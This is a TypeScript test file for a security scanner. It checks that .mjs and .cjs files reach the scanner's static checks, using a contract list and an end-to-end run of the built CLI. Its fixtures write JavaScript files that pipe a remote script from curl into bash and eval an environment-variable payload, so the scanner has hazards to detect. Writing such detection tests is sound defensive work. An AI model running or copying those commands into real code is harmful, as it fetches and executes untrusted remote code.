/**
 * #414 — the static checks in `scanner.ts` enumerated file extensions by hand at
 * twelve JS-family call sites, in four different spellings, so whether a check
 * read your file depended on which check it was.
 *
 *   ['.ts', '.js']                    checkNemoClawPatterns
 *   ['.ts', '.js', '.mjs']            seven sites
 *   ['.ts', '.js', '.py', '.mjs']     two sites
 *   ['.ts', '.js', '.md', '.txt']     one site
 *
 * The sharpest sat three lines apart in `checkNemoClawPatterns`, whose docstring
 * says it detects "unsafe installs, missing digest verification, injection
 * vectors, secret leaks":
 *
 *   const shFiles   = walkDirectory(targetDir, ['.sh'], 0, 5);
 *   const tsJsFiles = walkDirectory(targetDir, ['.ts', '.js'], 0, 5);
 *
 * Measured on published 0.31.0, identical content in two files:
 *
 *   scripts/alpha.js    CRITICAL eval(), CRITICAL secret, HIGH credentials
 *   scripts/beta.mjs    nothing
 *
 * This is the sibling of #412/#413, which fixed the SEMANTIC compile set. That
 * one made `.mjs` reach NanoMind; this one makes it reach the static checks.
 *
 * TWO LAYERS, following the shape #413 established, because neither is enough:
 *
 *   Contract   — the table below is authored HERE and compared against the
 *                scanner's constant. Not derived from the code under test, so
 *                deleting `.mjs` from the constant fails it. Runs in CI, which
 *                is where a silent re-omission would land.
 *   End-to-end — a hazard really is reported in a `.mjs` by the built CLI.
 *                Proves the walks actually consult the constant, which the
 *                contract layer cannot. Needs `dist/`, so it self-skips.
 *
 * The NEGATIVE CONTROL is load-bearing in both. Without it, a scanner that read
 * every file regardless of extension would satisfy every positive case here.
 */
import { describe, it, expect, beforeAll } from 'vitest';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { JS_FAMILY_EXTENSIONS } from '../../src/hardening/scanner';
import { assertDistFreshIfPresent } from '../helpers/dist-freshness';

/**
 * The JavaScript family, authored as the contract. Deliberately NOT imported
 * from the thing under test for its own definition: a list read out of the code
 * being checked cannot fail when that code is wrong.
 *
 * Adding a language variant to the scanner means adding a row here. Removing one
 * then becomes a visible decision rather than a silent omission, which is the
 * entire defect this file exists for.
 */
const MUST_BE_SCANNED = ['.ts', '.js', '.mjs', '.cjs', '.tsx', '.jsx'] as const;

/**
 * Extensions that must NOT be swept into the JS family. These are not "files we
 * ignore" — several are scanned by their own single-language walks. They are
 * here so that widening the constant into a general "every source file" list
 * fails, because a shell check handed a `.tsx` learns nothing and costs time.
 */
const MUST_NOT_BE_IN_JS_FAMILY = ['.sh', '.py', '.yaml', '.yml', '.md', '.txt', '.json', '.bin'] as const;

describe('#414 static-check source extensions: contract', () => {
  it('covers every JavaScript-family extension', () => {
    for (const ext of MUST_BE_SCANNED) {
      expect(
        (JS_FAMILY_EXTENSIONS as readonly string[]).includes(ext),
        `${ext} is missing from JS_FAMILY_EXTENSIONS, so every static check that ` +
          `walks the JS family stops reading ${ext} files while still reporting a score`,
      ).toBe(true);
    }
  });

  it('is exactly the JavaScript family and has not been widened into everything', () => {
    for (const ext of MUST_NOT_BE_IN_JS_FAMILY) {
      expect(
        (JS_FAMILY_EXTENSIONS as readonly string[]).includes(ext),
        `${ext} was added to JS_FAMILY_EXTENSIONS. Single-language walks keep their ` +
          `own arrays on purpose; widening this one hands shell and Python checks files ` +
          `they cannot read.`,
      ).toBe(false);
    }
    expect([...JS_FAMILY_EXTENSIONS].sort()).toEqual([...MUST_BE_SCANNED].sort());
  });

  it('leaves no hand-written JS-family array behind in the scanner', async () => {
    // The defect was not one bad list, it was twelve independent ones. A new
    // call site written the old way reintroduces it, and only a source-level
    // check catches that before it ships.
    const { readFile } = await import('node:fs/promises');
    const source = await readFile(join(__dirname, '../../src/hardening/scanner.ts'), 'utf8');
    const handWritten = source
      .split('\n')
      .map((line, i) => [i + 1, line] as const)
      .filter(([, line]) => /walkDirectory\([^)]*\['\.ts'/.test(line))
      .filter(([, line]) => !line.trim().startsWith('*') && !line.trim().startsWith('//'));
    expect(
      handWritten.map(([n, l]) => `${n}: ${l.trim()}`),
      'a walkDirectory call is enumerating the JS family by hand again; use JS_FAMILY_EXTENSIONS',
    ).toEqual([]);
  });
});

describe('#414 static-check source extensions: end to end', () => {
  const cli = join(__dirname, '../../dist/cli.js');
  const built = existsSync(cli);

  // Required of every suite that spawns the built CLI, and enforced by
  // __tests__/harness/spawn-suites-assert-freshness.test.ts, which caught this
  // file for omitting it. Without it this suite would spawn the PREVIOUS binary
  // and report a pass for source it never ran, which is the same shape as the
  // defect the whole change is about.
  beforeAll(assertDistFreshIfPresent);

  it.skipIf(!built)('reports a hazard in .mjs and .cjs, not only in .js', () => {
    const root = mkdtempSync(join(tmpdir(), 'hma-414-'));
    try {
      mkdirSync(join(root, 'scripts'), { recursive: true });
      writeFileSync(join(root, 'package.json'), '{"name":"p","version":"0.0.1"}\n');
      // Distinct payload per file, so a single finding cannot be mistaken for
      // several through deduplication.
      const body = (tag: string) =>
        `const { execSync } = require("child_process");\n` +
        `execSync("curl -sL http://example.com/${tag}.sh | bash");\n` +
        `eval(process.env.PAYLOAD_${tag.toUpperCase()});\n`;
      for (const [name, tag] of [['alpha.js', 'alpha'], ['beta.mjs', 'beta'], ['gamma.cjs', 'gamma']]) {
        writeFileSync(join(root, 'scripts', name), body(tag));
      }
      // Negative control: identical hazard in an extension nothing should read.
      writeFileSync(join(root, 'scripts', 'delta.bin'), body('delta'));

      const run = spawnSync(process.execPath, [cli, 'secure', '--ci', '--verbose'], {
        cwd: root,
        encoding: 'utf8',
      });
      const output = `${run.stdout ?? ''}${run.stderr ?? ''}`;

      expect(output, 'the .js baseline stopped being reported, so this test proves nothing')
        .toMatch(/alpha\.js/);
      expect(output, '.mjs is not reaching the static checks (#414)').toMatch(/beta\.mjs/);
      expect(output, '.cjs is not reaching the static checks (#414)').toMatch(/gamma\.cjs/);
      expect(output, 'the .bin negative control was read, so extension gating is not happening at all')
        .not.toMatch(/delta\.bin/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});
